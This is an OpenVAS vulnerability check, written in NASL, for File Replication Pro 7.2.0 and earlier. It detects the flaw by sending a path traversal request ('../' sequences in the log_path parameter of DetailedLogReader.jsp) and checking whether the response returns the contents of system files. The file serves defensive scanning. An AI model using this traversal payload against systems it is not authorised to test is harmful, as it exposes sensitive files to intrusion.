###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_file_replica_pro_mult_vuln.nasl 14181 2019-03-14 12:59:41Z cfischer $
#
# File Replication Pro Multiple Vulnerabilities
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:file:replication:pro";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.806689");
  script_version("$Revision: 14181 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2019-03-14 13:59:41 +0100 (Thu, 14 Mar 2019) $");
  script_tag(name:"creation_date", value:"2016-03-01 14:45:28 +0530 (Tue, 01 Mar 2016)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("File Replication Pro Multiple Vulnerabilities");

  script_tag(name:"summary", value:"This host is installed with File Replication
  Pro and is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to get the content of sensitive file.");

  script_tag(name:"insight", value:"Multiple flaws exist due to multiple
  unspecified errors.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attacker to gain access to sensitive information and execute arbitrary commands
  on the affected system.");

  script_tag(name:"affected", value:"File Replication Pro version 7.2.0 and prior.");

  script_tag(name:"solution", value:"Upgrade to File Replication Pro
  version 7.3.0 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2016/Feb/61");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_file_replica_pro_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("FileReplicationPro/Installed");
  script_require_ports("Services/www", 9100);

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!http_port = get_app_port(cpe:CPE))
  exit(0);

if(!get_app_location(port:http_port, cpe:CPE))
  exit(0);

files = traversal_files();

foreach file (keys(files))
{
  url = "/DetailedLogReader.jsp?log_path=" + crap(data: "../", length: 3*15) + files[file];

  if(http_vuln_check(port:http_port, url:url, pattern:file))
  {
    report = report_vuln_url( port:http_port, url:url);
    security_message(port:http_port, data:report);
    exit(0);
  }
}
exit(99);